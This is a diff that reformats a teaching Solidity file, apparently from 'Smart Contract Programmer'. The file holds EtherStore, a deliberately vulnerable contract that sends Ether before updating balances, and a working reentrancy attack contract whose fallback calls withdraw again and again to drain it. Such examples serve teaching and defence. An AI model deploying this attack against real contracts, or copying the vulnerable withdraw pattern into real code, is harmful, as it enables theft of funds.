@@ -29,13 +29,14 @@ Here is how the functions were called
 */
 
 contract EtherStore {
-    mapping (address => uint) public balances;
+    mapping(address => uint256) public balances;
 
     function deposit() public payable {
         balances[msg.sender] += msg.value;
     }
+
     function withdraw() public {
-        uint bal = balances[msg.sender];
+        uint256 bal = balances[msg.sender];
         require(bal > 0);
 
         (bool sent, ) = msg.sender.call{value: bal}("");
@@ -45,36 +46,35 @@ contract EtherStore {
     }
 
     // Helper function to check the balance of this contract
-    function getBalance() public view returns (uint) {
+    function getBalance() public view returns (uint256) {
         return address(this).balance;
     }
 }
 
-contract Attack1 {
+contract EtherStoreAttack {
     EtherStore public etherStore;
 
-    constructor(address _etherStoreAddress){
+    constructor(address _etherStoreAddress) {
         etherStore = EtherStore(_etherStoreAddress);
     }
 
     // Fallback is called when EtherStore sends Ether to this contract
     fallback() external payable {
-        if(address(etherStore).balance >= 1){
+        if (address(etherStore).balance >= 1) {
             etherStore.withdraw();
         }
     }
 
     function attack() external payable {
-        require(msg.value >= 1 ether);
+        require(msg.value >= 1 ether, "more eth needed");
         etherStore.deposit{value: 1 ether}();
         etherStore.withdraw();
     }
 
     // Helper function to check the balance of this contract
-    function getBalance() public view returns (uint) {
+    function getBalance() public view returns (uint256) {
         return address(this).balance;
     }
-
 }
 
-// Code from Smart Contract Programmer 
+// Code from Smart Contract Programmer
